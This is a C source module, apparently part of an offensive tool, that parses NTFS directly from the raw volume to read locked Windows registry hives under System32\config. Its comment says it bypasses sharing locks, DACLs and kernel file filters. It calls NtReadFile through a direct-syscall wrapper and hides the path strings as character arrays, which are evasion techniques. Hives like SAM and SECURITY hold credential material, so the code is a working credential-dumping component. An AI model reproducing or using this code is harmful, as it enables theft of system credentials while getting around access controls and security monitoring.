/**
 * Raw NTFS reader — read files directly from disk clusters.
 * Bypasses file system sharing, DACLs, and kernel file filters.
 * Used when hive files are exclusively locked by the Configuration Manager.
 */

#include <windows.h>
#include "../include/ntdefs.h"
#include "../include/syscalls.h"

/* ── NTFS constants ──────────────────────────────────────── */

#define ATTR_ATTRIBUTE_LIST 0x20
#define ATTR_FILE_NAME      0x30
#define ATTR_DATA           0x80
#define ATTR_INDEX_ROOT     0x90
#define ATTR_INDEX_ALLOC    0xA0
#define ATTR_END            0xFFFFFFFF
#define MFT_ENTRY_ROOT      5
#define MAX_RUNS            128

/* ── Volume context ──────────────────────────────────────── */

typedef struct {
    HANDLE    hVol;
    DWORD     bps;   /* bytes per sector */
    DWORD     bpc;   /* bytes per cluster */
    DWORD     mft_sz; /* MFT record size */
    ULONGLONG mft_byte; /* MFT start on disk */
    ULONGLONG mft_lcn[64];
    ULONGLONG mft_vcn[64];
    DWORD     mft_clen[64];
    DWORD     mft_runs;
} NCTX;

/* ── Disk read ───────────────────────────────────────────── */

static BOOL dread(NCTX *c, ULONGLONG off, BYTE *buf, DWORD len) {
    LARGE_INTEGER li;
    li.QuadPart = (LONGLONG)off;
    while (len > 0) {
        IO_STATUS_BLOCK io;
        DWORD chunk = len > 65536 ? 65536 : len;
        if (!NT_SUCCESS(sys_NtReadFile(c->hVol, NULL, NULL, NULL,
                                        &io, buf, chunk, &li, NULL)))
            return FALSE;
        DWORD got = (DWORD)io.Information;
        if (got == 0) return FALSE;
        buf += got; len -= got;
        li.QuadPart += got;
    }
    return TRUE;
}

/* ── Update sequence fixup ───────────────────────────────── */

static void fixup(BYTE *rec, DWORD rec_sz, DWORD sec_sz) {
    WORD usa_off = *(WORD *)(rec + 4);
    WORD usa_cnt = *(WORD *)(rec + 6);
    if (usa_cnt < 2 || usa_off >= rec_sz) return;
    WORD *usa = (WORD *)(rec + usa_off);
    for (WORD i = 1; i < usa_cnt; i++) {
        DWORD pos = i * sec_sz - 2;
        if (pos + 2 <= rec_sz)
            *(WORD *)(rec + pos) = usa[i];
    }
}

/* ── Data run decoding ───────────────────────────────────── */

static DWORD decode_runs(BYTE *r, DWORD maxb,
                          ULONGLONG *lcn, ULONGLONG *vcn, DWORD *clen,
                          DWORD max_runs) {
    DWORD n = 0, p = 0;
    ULONGLONG v = 0;
    LONGLONG prev = 0;
    while (p < maxb && r[p] && n < max_runs) {
        BYTE hdr = r[p++];
        BYTE ls = hdr & 0xF, os = hdr >> 4;
        if (!ls || p + ls + os > maxb) break;
        ULONGLONG rl = 0;
        for (BYTE i = 0; i < ls; i++) rl |= (ULONGLONG)r[p++] << (i * 8);
        LONGLONG ro = 0;
        for (BYTE i = 0; i < os; i++) ro |= (LONGLONG)r[p++] << (i * 8);
        if (os && (r[p - 1] & 0x80))
            for (BYTE i = os; i < 8; i++) ro |= (LONGLONG)0xFF << (i * 8);
        if (!os) { v += rl; continue; }
        prev += ro;
        vcn[n] = v; lcn[n] = (ULONGLONG)prev; clen[n] = (DWORD)rl;
        v += rl; n++;
    }
    return n;
}

/* ── Boot sector ─────────────────────────────────────────── */

static BOOL parse_boot(NCTX *c, BYTE *b) {
    if (!dread(c, 0, b, 512)) return FALSE;
    if (b[3]!='N'||b[4]!='T'||b[5]!='F'||b[6]!='S') return FALSE;
    c->bps = *(WORD *)(b + 0x0B);
    c->bpc = c->bps * b[0x0D];
    char ms = (char)b[0x40];
    c->mft_sz = ms > 0 ? (DWORD)ms * c->bpc : 1u << (-ms);
    c->mft_byte = *(ULONGLONG *)(b + 0x30) * c->bpc;
    return TRUE;
}

/* ── Read raw MFT record at byte offset ──────────────────── */

static BOOL read_mft_raw(NCTX *c, ULONGLONG off, BYTE *buf) {
    if (!dread(c, off, buf, c->mft_sz)) return FALSE;
    if (buf[0]!='F'||buf[1]!='I'||buf[2]!='L'||buf[3]!='E') return FALSE;
    fixup(buf, c->mft_sz, c->bps);
    return TRUE;
}

/* ── Build MFT data-run map from entry 0 ─────────────────── */

static BOOL build_mft_map(NCTX *c, BYTE *buf) {
    if (!read_mft_raw(c, c->mft_byte, buf)) return FALSE;
    BYTE *a = buf + *(WORD *)(buf + 0x14);
    while (a < buf + c->mft_sz - 4) {
        DWORD t = *(DWORD *)a;
        DWORD al = *(DWORD *)(a + 4);
        if (t == ATTR_END || !t || al < 16) break;
        if (t == ATTR_DATA && a[8] == 1) {
            WORD ro = *(WORD *)(a + 0x20);
            c->mft_runs = decode_runs(a + ro, al - ro,
                c->mft_lcn, c->mft_vcn, c->mft_clen, 64);
            return c->mft_runs > 0;
        }
        a += al;
    }
    return FALSE;
}

/* ── Read MFT entry by number ────────────────────────────── */

static BOOL read_mft(NCTX *c, ULONGLONG num, BYTE *buf) {
    ULONGLONG byte_off = num * c->mft_sz;
    ULONGLONG need_vcn = byte_off / c->bpc;
    DWORD in_cluster = (DWORD)(byte_off % c->bpc);
    for (DWORD i = 0; i < c->mft_runs; i++) {
        if (need_vcn >= c->mft_vcn[i] &&
            need_vcn < c->mft_vcn[i] + c->mft_clen[i]) {
            ULONGLONG disk = (c->mft_lcn[i] + need_vcn - c->mft_vcn[i])
                             * c->bpc + in_cluster;
            return read_mft_raw(c, disk, buf);
        }
    }
    return FALSE;
}

/* ── Attribute helpers ───────────────────────────────────── */

static BYTE *find_attr(BYTE *e, DWORD esz, DWORD type) {
    BYTE *a = e + *(WORD *)(e + 0x14);
    while (a < e + esz - 4) {
        DWORD t = *(DWORD *)a;
        DWORD al = *(DWORD *)(a + 4);
        if (t == ATTR_END || !t || al < 16) break;
        if (t == type) {
            BYTE name_len = a[9];
            if (type != ATTR_DATA || name_len == 0) return a;
        }
        a += al;
    }
    return NULL;
}

/* ── Case-insensitive wchar compare ──────────────────────── */

static BOOL nmatch(const wchar_t *a, int al, const wchar_t *b, int bl) {
    if (al != bl) return FALSE;
    for (int i = 0; i < al; i++) {
        wchar_t ca = a[i], cb = b[i];
        if (ca >= L'A' && ca <= L'Z') ca += 32;
        if (cb >= L'A' && cb <= L'Z') cb += 32;
        if (ca != cb) return FALSE;
    }
    return TRUE;
}

/* ── Search index entries for a filename ─────────────────── */

static ULONGLONG search_idx(BYTE *ent, DWORD sz,
                             const wchar_t *name, int nlen) {
    DWORD p = 0;
    while (p + 16 <= sz) {
        WORD elen = *(WORD *)(ent + p + 8);
        DWORD flags = *(DWORD *)(ent + p + 0x0C);
        if (elen < 16) break;
        if (!(flags & 2)) { /* not last entry */
            WORD clen = *(WORD *)(ent + p + 0x0A);
            if (clen >= 0x44) {
                BYTE fnl = ent[p + 0x50];
                BYTE fns = ent[p + 0x51];
                wchar_t *fn = (wchar_t *)(ent + p + 0x52);
                if (fns != 2 && nmatch(fn, fnl, name, nlen)) {
                    ULONGLONG ref = *(ULONGLONG *)(ent + p);
                    return ref & 0x0000FFFFFFFFFFFF;
                }
            }
        }
        if (flags & 2) break;
        p += elen;
    }
    return 0;
}

/* ── Find name in a directory MFT entry ──────────────────── */

static ULONGLONG find_in_dir(NCTX *c, BYTE *de,
                              const wchar_t *name, int nlen,
                              BYTE *work, DWORD wsz) {
    /* $INDEX_ROOT (resident) */
    BYTE *ir = find_attr(de, c->mft_sz, ATTR_INDEX_ROOT);
    if (ir && ir[8] == 0) {
        WORD voff = *(WORD *)(ir + 0x14);
        BYTE *val = ir + voff;
        DWORD eoff = *(DWORD *)(val + 0x10);
        DWORD etot = *(DWORD *)(val + 0x14);
        BYTE *ents = val + 0x10 + eoff;
        DWORD esz = etot > eoff ? etot - eoff : 0;
        ULONGLONG r = search_idx(ents, esz, name, nlen);
        if (r) return r;
    }

    /* $INDEX_ALLOCATION (non-resident) */
    BYTE *ia = find_attr(de, c->mft_sz, ATTR_INDEX_ALLOC);
    if (!ia || ia[8] != 1) return 0;
    WORD roff = *(WORD *)(ia + 0x20);
    ULONGLONG rsize = *(ULONGLONG *)(ia + 0x30);
    ULONGLONG ia_lcn[32], ia_vcn[32]; DWORD ia_cl[32];
    DWORD ia_n = decode_runs(ia + roff, *(DWORD *)(ia + 4) - roff,
                              ia_lcn, ia_vcn, ia_cl, 32);

    DWORD irsz = 4096;
    if (ir && ir[8] == 0) {
        WORD voff = *(WORD *)(ir + 0x14);
        irsz = *(DWORD *)(ir + voff + 8);
    }
    if (irsz > wsz) return 0;

    ULONGLONG done = 0;
    for (DWORD r = 0; r < ia_n && done < rsize; r++) {
        for (DWORD cl = 0; cl < ia_cl[r]; cl++) {
            ULONGLONG dpos = (ia_lcn[r] + cl) * c->bpc;
            for (DWORD ro = 0; ro < c->bpc; ro += irsz) {
                if (done + ro >= rsize) goto out;
                if (!dread(c, dpos + ro, work, irsz)) continue;
                if (work[0]!='I'||work[1]!='N'||work[2]!='D'||work[3]!='X')
                    continue;
                fixup(work, irsz, c->bps);
                DWORD eo = *(DWORD *)(work + 0x18) + 0x18;
                DWORD es = irsz > eo ? irsz - eo : 0;
                ULONGLONG ref = search_idx(work + eo, es, name, nlen);
                if (ref) return ref;
            }
            done += c->bpc;
        }
    }
out:
    return 0;
}

/* ── Read $DATA from data runs ───────────────────────────── */

static DWORD read_data_runs(NCTX *c, BYTE *attr, BYTE *out, DWORD max) {
    WORD roff = *(WORD *)(attr + 0x20);
    ULONGLONG rsz = *(ULONGLONG *)(attr + 0x30);
    if (rsz > max) rsz = max;
    ULONGLONG rlcn[MAX_RUNS], rvcn[MAX_RUNS]; DWORD rcl[MAX_RUNS];
    DWORD rn = decode_runs(attr + roff, *(DWORD *)(attr + 4) - roff,
                            rlcn, rvcn, rcl, MAX_RUNS);
    DWORD total = 0;
    for (DWORD i = 0; i < rn && total < (DWORD)rsz; i++) {
        for (DWORD cl = 0; cl < rcl[i] && total < (DWORD)rsz; cl++) {
            ULONGLONG dp = (rlcn[i] + cl) * c->bpc;
            DWORD rd = c->bpc;
            if (total + rd > (DWORD)rsz) rd = (DWORD)rsz - total;
            if (!dread(c, dp, out + total, rd)) return total;
            total += rd;
        }
    }
    return total;
}

/* ── Read file data (handles resident, non-resident, attribute list) ─ */

static DWORD read_file(NCTX *c, ULONGLONG fnum, BYTE *out, DWORD max,
                        BYTE *work, DWORD wsz) {
    BYTE mft[4096];
    if (c->mft_sz > sizeof(mft)) return 0;
    if (!read_mft(c, fnum, mft)) return 0;

    BYTE *da = find_attr(mft, c->mft_sz, ATTR_DATA);
    if (da) {
        if (da[8] == 0) {
            /* Resident */
            DWORD vl = *(DWORD *)(da + 0x10);
            WORD vo = *(WORD *)(da + 0x14);
            if (vl > max) vl = max;
            BYTE *v = da + vo;
            for (DWORD i = 0; i < vl; i++) out[i] = v[i];
            return vl;
        }
        return read_data_runs(c, da, out, max);
    }

    /* $DATA not in base entry — check $ATTRIBUTE_LIST */
    BYTE *al = find_attr(mft, c->mft_sz, ATTR_ATTRIBUTE_LIST);
    if (!al) return 0;

    BYTE *ld; DWORD ll;
    if (al[8] == 0) {
        ll = *(DWORD *)(al + 0x10);
        ld = al + *(WORD *)(al + 0x14);
    } else {
        if (wsz < 65536) return 0;
        ll = read_data_runs(c, al, work, wsz);
        ld = work;
    }

    /* Collect $DATA runs from extension entries */
    ULONGLONG all_lcn[MAX_RUNS], all_vcn[MAX_RUNS]; DWORD all_cl[MAX_RUNS];
    DWORD total_runs = 0;
    ULONGLONG real_sz = 0;

    DWORD p = 0;
    while (p + 26 <= ll) {
        DWORD type = *(DWORD *)(ld + p);
        WORD el = *(WORD *)(ld + p + 4);
        if (el < 26) break;
        if (type == ATTR_DATA) {
            ULONGLONG eref = *(ULONGLONG *)(ld + p + 16);
            ULONGLONG entry_num = eref & 0x0000FFFFFFFFFFFF;
            BYTE ext[4096];
            if (read_mft(c, entry_num, ext)) {
                BYTE *ea = ext + *(WORD *)(ext + 0x14);
                while (ea < ext + c->mft_sz - 4) {
                    DWORD et = *(DWORD *)ea;
                    DWORD eal = *(DWORD *)(ea + 4);
                    if (et == ATTR_END || !et || eal < 16) break;
                    if (et == ATTR_DATA && ea[8] == 1 && ea[9] == 0) {
                        WORD ro = *(WORD *)(ea + 0x20);
                        DWORD nr = decode_runs(ea + ro, eal - ro,
                            all_lcn + total_runs, all_vcn + total_runs,
                            all_cl + total_runs, MAX_RUNS - total_runs);
                        total_runs += nr;
                        ULONGLONG rs = *(ULONGLONG *)(ea + 0x30);
                        if (rs > real_sz) real_sz = rs;
                    }
                    ea += eal;
                }
            }
        }
        p += el;
    }

    if (!total_runs) return 0;
    if (real_sz > max) real_sz = max;

    DWORD total = 0;
    for (DWORD i = 0; i < total_runs && total < (DWORD)real_sz; i++) {
        for (DWORD cl = 0; cl < all_cl[i] && total < (DWORD)real_sz; cl++) {
            ULONGLONG dp = (all_lcn[i] + cl) * c->bpc;
            DWORD rd = c->bpc;
            if (total + rd > (DWORD)real_sz) rd = (DWORD)real_sz - total;
            if (!dread(c, dp, out + total, rd)) return total;
            total += rd;
        }
    }
    return total;
}

/* ── Public API ──────────────────────────────────────────── */

DWORD ntfs_read_hive(HANDLE hVolume, const wchar_t *hive_name, int hive_name_len,
                     BYTE *out, DWORD out_size,
                     BYTE *work, DWORD work_size,
                     DWORD *err) {
    NCTX c;
    c.hVol = hVolume;
    c.mft_runs = 0;
    *err = 0;

    BYTE boot[512];
    if (!parse_boot(&c, boot)) { *err = 1; return 0; }

    BYTE mft0[4096];
    if (c.mft_sz > sizeof(mft0)) { *err = 4; return 0; }
    if (!build_mft_map(&c, mft0)) { *err = 3; return 0; }

    wchar_t w1[] = {L'W',L'i',L'n',L'd',L'o',L'w',L's'};
    wchar_t w2[] = {L'S',L'y',L's',L't',L'e',L'm',L'3',L'2'};
    wchar_t w3[] = {L'c',L'o',L'n',L'f',L'i',L'g'};

    struct { const wchar_t *n; int l; } path[] = {
        {w1, 7}, {w2, 8}, {w3, 6}, {hive_name, hive_name_len}
    };

    ULONGLONG cur = MFT_ENTRY_ROOT;
    BYTE de[4096];
    if (c.mft_sz > sizeof(de)) { *err = 4; return 0; }

    for (int i = 0; i < 4; i++) {
        if (!read_mft(&c, cur, de)) { *err = 10 + i; return 0; }
        cur = find_in_dir(&c, de, path[i].n, path[i].l, work, work_size);
        if (!cur) { *err = 20 + i; return 0; }
    }

    DWORD got = read_file(&c, cur, out, out_size, work, work_size);
    if (!got) { *err = 31; return 0; }
    return got;
}
